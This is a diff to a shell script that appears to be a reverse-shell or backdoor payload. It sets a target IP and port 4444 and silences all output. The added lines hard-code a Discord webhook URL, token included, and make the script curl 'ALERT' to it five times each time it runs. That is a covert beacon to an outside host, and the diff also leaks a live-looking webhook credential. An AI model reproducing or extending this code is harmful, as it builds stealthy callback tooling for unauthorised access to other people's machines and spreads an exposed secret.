@@ -4,6 +4,22 @@
 ip_addr="192.168.0.107"
 port="4444"
 
+# Discord webhook URL (replace with your actual webhook URL)
+webhook_url="https://discord.com/api/webhooks/1264765951304400988/n9j21NuQaNl6kJpELTOWiuJeamFuZgqvbQasu__R5bumeALy4-6nyJgizai_2DGjbia3"
+
+# Function to send alert messages to Discord webhook
+send_discord_alert() {
+    for i in {1..5}; do
+        curl -H "Content-Type: application/json" \
+            -d '{"content": "ALERT"}' \
+            $webhook_url
+        sleep 1
+    done
+}
+
+# Send alert messages when the script is executed
+send_discord_alert
+
 # Redirect all output and error messages to /dev/null
 exec 1>/dev/null 2>&1
 
